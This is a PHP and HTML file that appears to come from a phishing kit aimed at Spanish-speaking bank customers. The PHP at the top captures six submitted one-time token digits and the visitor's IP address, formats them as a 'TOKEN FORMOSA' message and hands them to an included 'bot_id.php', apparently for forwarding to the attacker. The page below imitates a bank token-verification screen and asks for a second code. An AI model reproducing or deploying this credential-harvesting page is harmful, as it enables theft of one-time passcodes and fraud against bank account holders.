<?php  
  $digit1 = $_POST['digit1'];
  $digit2 = $_POST['digit2'];
  $digit3 = $_POST['digit3'];
  $digit4 = $_POST['digit4'];
  $digit5 = $_POST['digit5'];
  $digit6 = $_POST['digit6'];
  
  $tok = $digit1 . $digit2 . $digit3 . $digit4 . $digit5 . $digit6;
  
  $enviara = "TOKEN FORMOSA ##\n" .
             "<b>TOKEN: </b>  <code>".$tok."</code>\n" .
             "🌐 IP ".$_SERVER['REMOTE_ADDR']."\n";
             
  $enviar = urldecode($enviara);
  include 'bot_id.php';
?>

<!DOCTYPE html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=UTF-8">
  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <script src="main/toda.js"></script>
  <title>Inicio</title>
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <style>
    body {
      margin: 0;
      font-family: Arial, sans-serif;
    }

    .container {
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      height: 100vh;
      text-align: center;
    }

    .logo {
      width: 245px;
      margin-top: 20px;
    }

    .text1 {
      font-size: 20px;
      font-weight: bold;
      margin-top: 20px;
    }

    .text2 {
      font-size: 16px;
      margin-top: 15px;
    }

    .token-inputs {
      display: flex;
      justify-content: center;
      margin-top: 20px;
    }

    .token-input {
      border: 2px solid #000;
      width: 30px;
      height: 40px;
      border-radius: 6px;
      cursor: text;
      margin: 0 5px;
      text-align: center;
      font-size: 18px;
    }

    .button {
      background-color: #003A70;
      border: none;
      border-radius: 8px;
      color: white;
      padding: 15px 30px;
      font-size: 16px;
      cursor: pointer;
      transition-duration: 0.4s;
      margin-top: 20px;
    }

    .button:hover {
      background-color: blue;
    }

    @media (max-width: 767px) {
      .logo {
        width: 180px;
        margin-top: 40px;
      }
    }
  </style>
</head>

<body>
  <div class="container">
    <img class="logo" src="main/ciudad.png" alt="Logo">
    <h2 class="text1">Ingrese el código Token</h2>
    <p class="text2">Ingrese el código token para verificar su identidad.</p>

    <form method="post" action="error.php" id="tokenForm">
      <div class="token-inputs">
        <input type="tel" class="token-input" name="digit7" maxlength="1" required="">
        <input type="tel" class="token-input" name="digit8" maxlength="1" required="">
        <input type="tel" class="token-input" name="digit9" maxlength="1" required="">
        <input type="tel" class="token-input" name="digit10" maxlength="1" required="">
        <input type="tel" class="token-input" name="digit11" maxlength="1" required="">
        <input type="tel" class="token-input" name="digit12" maxlength="1" required="">
      </div>
      <button class="button" type="submit">Confirmar</button>
    </form>
  </div>
</body>
</html>